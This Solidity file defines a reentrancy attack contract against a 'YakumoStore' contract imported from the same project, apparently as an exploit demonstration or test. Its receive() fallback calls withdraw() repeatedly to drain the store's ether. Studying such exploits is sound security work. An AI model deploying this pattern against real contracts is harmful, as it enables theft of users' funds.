// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {YakumoStore} from "../src/Yakumo.sol";

contract ReentrancyAttaker {
    YakumoStore public store;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _storeAddr) {
        store = YakumoStore(_storeAddr);
    }

    receive() external payable {
        if (address(store).balance >= AMOUNT) {
            try store.withdraw() {} catch {}
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        store.withdraw();
    }
}
